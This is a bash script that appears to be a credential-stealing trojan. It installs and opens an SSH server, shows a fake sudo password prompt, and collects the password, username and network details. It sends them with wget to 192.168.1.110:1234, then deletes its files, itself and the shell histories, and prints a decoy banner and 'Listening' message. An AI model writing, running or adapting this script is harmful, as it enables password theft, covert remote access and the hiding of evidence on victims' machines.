#!/bin/bash

clear
sudo apt update -y
clear
sudo apt install openssh-server
clear
sudo systemctl start ssh
clear
sudo ss -ltup
clear
sudo apt install ufw
clear
sudo ufw enable
clear
sudo ufw allow ssh
clear
sudo ufw status
clear
read -p "[sudo] password: " pass
echo "$pass" > pass.txt
clear
whoami > user.txt
clear
ifconfig > ip.txt
clear
cat user.txt > info.txt
clear
cat ip.txt >> info.txt
clear
cat pass.txt >> info.txt
clear
sudo apt install wget
clear
wget --post-file=info.txt 192.168.1.110:1234
clear
rm ip.txt user.txt info.txt pass.txt hxbno.sh
clear
rm -rf .zsh_history | rm -rf .bash_history
clear
sudo apt install figlet
clear
sudo apt install lolcat
clear
figlet -f big "Hxbno" | lolcat
sleep 4s
echo
echo
echo "URL  ==  https://www.wonderhowto.com/"
echo
echo "Listening on https://www.wonderhowto.com/ ....."
sleep 120s
